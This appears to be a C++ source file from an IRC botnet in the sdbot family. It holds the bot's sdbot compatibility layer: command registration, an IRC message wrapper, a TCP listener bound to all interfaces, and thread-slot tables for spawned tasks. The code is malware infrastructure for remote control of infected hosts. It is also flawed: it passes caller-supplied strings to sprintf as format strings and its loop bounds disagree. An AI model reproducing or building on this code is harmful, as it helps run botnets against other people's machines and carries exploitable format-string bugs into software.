

#include "main.h"
#include "sdcompat.h"
#include "mainctrl.h"

void CsdbotCompat::Init() {
	REGCMD(m_cmdTest,	"sd.test",	"test",	false,	this);
}

int CsdbotCompat::Compat(char *a[32], bool notice, bool silent,char *msg_real_dest) {
	char sendbuf[512];

	return 0;
}

char * replacestr(char *str, char *oldstr, char *newstr);
void irc_privmsg(SOCKET sock,char *a,char *msgstr,bool notice){
g_pMainCtrl->m_cIRC.SendMsg(false, notice, msgstr, a);
}
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }


 

  SOCKET Listen(int port) {
	  thred * threds = g_pMainCtrl->m_SdCompat.threds;
	SOCKET sock;
	SOCKADDR_IN  SockAddr;
   	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	SockAddr.sin_addr.s_addr = INADDR_ANY;  
	if (bind(sock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
		return -1;//port is in use ?
	if (listen(sock, SOMAXCONN) != 0) 
		return -1;
	return sock;
 }

   int spyaddthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir) {
	   thred * threds = g_pMainCtrl->m_SdCompat.threds;
	int c;
	for (c=0;c <= 40;c++)
		if (threds[c].id == 0) break;
	if (c > 19) return -1;
	sprintf(threds[c].name,name);
	threds[c].id = id;
	threds[c].num = c;
	threds[c].sock = sock;
	threds[c].Threat_Handle = Threat_Handle;
	sprintf(threds[c].dir,dir);
	return c;
 }

int addthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir){
	thread * threads = g_pMainCtrl->m_SdCompat.threads;
	int c;
	for (c=0;c <= 40;c++)
		if (threads[c].id == 0) break;
	if (c > 19) return -1;
	sprintf(threads[c].name,name);
	threads[c].id = id;
	threads[c].num = c;
	threads[c].sock = sock;
	threads[c].Threat_Handle = Threat_Handle;
	sprintf(threads[c].dir,dir);
	return c;
}

bool CsdbotCompat::HandleCommand(CMessage *pMsg) {	
	return false; }
